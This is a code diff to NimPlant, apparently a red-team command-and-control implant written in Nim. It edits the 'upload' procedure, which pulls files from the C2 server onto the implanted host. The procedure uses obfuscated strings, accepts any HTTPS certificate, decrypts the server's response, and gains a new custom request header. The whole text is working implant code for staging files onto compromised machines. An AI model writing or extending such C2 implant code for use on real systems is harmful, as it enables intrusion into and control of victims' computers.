@@ -8,7 +8,7 @@ import puppy
 # Upload a file from the C2 server to NimPlant
 # From NimPlant's perspective this is similar to wget, but calling to the C2 server instead
 proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
-    var 
+    var
         fileId : string
         fileName : string
         filePath : string
@@ -26,7 +26,7 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
         # Handling of the second argument (filename) is done by the python server
         result = obf("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.")
         return
-    
+
     url = toLowerAscii(li.listenerType) & obf("://")
     if li.listenerHost != "":
         url = url & li.listenerHost
@@ -40,7 +40,8 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
         headers: @[
                 Header(key: obf("User-Agent"), value: li.userAgent),
                 Header(key: obf("X-Identifier"), value: li.id), # Nimplant ID
-                Header(key: obf("X-Unique-ID"), value: cmdGuid)  # Task GUID
+                Header(key: obf("X-Unique-ID"), value: cmdGuid),  # Task GUID
+                Header(key: obf("X-Header"), value: li.customHeaderOne)
             ],
         allowAnyHttpsCertificate: true,
     )
@@ -50,7 +51,7 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
     if res.code != 200:
         result = obf("Something went wrong uploading the file (NimPlant did not receive response from staging server '") & url & obf("').")
         return
-    
+
     # Handle the encrypted and compressed response
     var dec = decryptData(res.body, li.cryptKey)
     var decStr: string = cast[string](dec)
